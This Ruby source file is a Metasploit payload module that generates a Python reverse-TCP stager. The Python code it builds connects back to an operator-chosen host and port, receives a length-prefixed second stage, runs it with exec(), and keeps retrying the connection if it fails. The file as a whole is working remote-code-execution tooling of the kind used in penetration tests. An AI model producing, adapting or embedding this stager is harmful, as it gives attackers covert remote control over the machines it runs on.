# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/send_uuid'

module Msf

###
#
# Complex reverse_tcp payload generation for Python
#
###

module Payload::Python::ReverseTcp

  include Msf::Payload::Python
  include Msf::Payload::Python::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['StagerRetryCount'],
      retry_wait:  datastore['StagerRetryWait'],
    }

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_reverse_tcp(opts={})
    # Set up the socket
    cmd  = "import socket,struct\n"
    cmd << "import time\n"
    cmd << "def connect():\n"
    cmd << "\ttry:\n"
    cmd << "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
    cmd << "\t\ts.connect(('#{opts[:host]}',#{opts[:port]}))\n"
    cmd << py_send_uuid if include_send_uuid
    cmd << "\t\tl=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "\t\td=s.recv(l)\n"
    cmd << "\t\twhile len(d)<l:\n"
    cmd << "\t\t\td+=s.recv(l-len(d))\n"
    cmd << "\t\texec(d,{'s':s})\n"
    cmd << "\texcept Exception:\n"
    cmd << "\t\t\ttime.sleep(#{opts[:retry_wait]})\n"
    cmd << "\t\t\tconnect()\n"
    cmd << "connect()\n"
    

    py_create_exec_stub(cmd)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end
